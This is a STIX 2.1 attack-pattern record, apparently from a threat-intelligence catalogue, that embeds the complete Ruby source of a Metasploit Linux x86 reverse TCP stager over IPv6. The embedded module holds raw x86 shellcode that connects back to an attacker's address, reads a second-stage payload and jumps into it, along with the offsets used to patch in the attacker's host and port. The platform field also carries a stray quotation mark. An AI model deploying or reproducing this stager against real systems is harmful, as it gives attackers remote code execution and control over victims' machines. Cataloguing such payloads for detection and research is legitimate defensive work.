{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--e0090572-547b-4c82-b822-91872f427549",
    "created": "2024-08-14T16:33:19.521796Z",
    "modified": "2024-08-14T16:33:19.5218Z",
    "name": "Reverse TCP Stager (IPv6)",
    "description": "Connect back to attacker over IPv6",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/payloads/stagers/linux/x86/reverse_ipv6_tcp.rb",
            "external_id": "reverse_ipv6_tcp.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n\n# Linux Reverse TCP/IPv6 Stager\nmodule MetasploitModule\n\n  CachedSize = 77\n\n  include Msf::Payload::Stager\n  include Msf::Payload::Linux\n\n  def self.handler_type_alias\n    \"reverse_ipv6_tcp\"\n  end\n\n  def initialize(info = {})\n    super(merge_info(info,\n      'Name'        => 'Reverse TCP Stager (IPv6)',\n      'Description' => 'Connect back to attacker over IPv6',\n      'Author'      => 'kris katterjohn',\n      'License'     => MSF_LICENSE,\n      'Platform'    => 'linux',\n      'Arch'        => ARCH_X86,\n      'Handler'     => Msf::Handler::ReverseTcp,\n      'Stager'      => {\n          'Offsets' => {\n            'ADDR' => [ 0x15, 'foo' ],\n            'LPORT' => [ 0x2c, 'n' ],\n            'SCOPEID' => [ 0x11, 'V' ]\n          },\n          'Payload' =>\n            \"\\x31\\xdb\\x53\\x43\\x53\\x6a\\x0a\\x89\\xe1\\x6a\\x66\\x58\\xcd\\x80\\x96\\x99\" +\n            \"\\x68\\x00\\x00\\x00\\x00\\x68\\xde\\xad\\xbe\\xef\\x68\\xde\\xad\\xbe\\xef\\x68\" +\n            \"\\xde\\xad\\xbe\\xef\\x68\\xde\\xad\\xbe\\xef\\x52\\x66\\x68\\xbf\\xbf\\x66\\x68\" +\n            \"\\x0a\\x00\\x89\\xe1\\x6a\\x1c\\x51\\x56\\x89\\xe1\\x43\\x43\\x6a\\x66\\x58\\xcd\" +\n            \"\\x80\\x89\\xf3\\xb6\\x0c\\xb0\\x03\\xcd\\x80\\x89\\xdf\\xff\\xe1\"\n        }\n      ))\n\n    register_options([\n      OptInt.new('SCOPEID', [false, \"IPv6 scope ID, for link-local addresses\", 0])\n    ])\n  end\n\n  # This isn't pretty, but then again neither are IPv6 addresses --Kris\n  def replace_var(raw, name, offset, pack)\n    return false unless name == 'ADDR'\n\n    addr = \"\"\n    substitute_vars(addr, { 'LHOST' => [ 0, 'ADDR6' ] })\n\n    repl = \"\"\n\n    addr.unpack('V*').reverse.each do |x|\n      repl += Rex::Arch::X86.push_dword(x)\n    end\n\n    raw[offset, repl.length] = repl\n\n    true\n  end\nend\n",
    "x_mitre_platforms": [
        "linux'"
    ]
}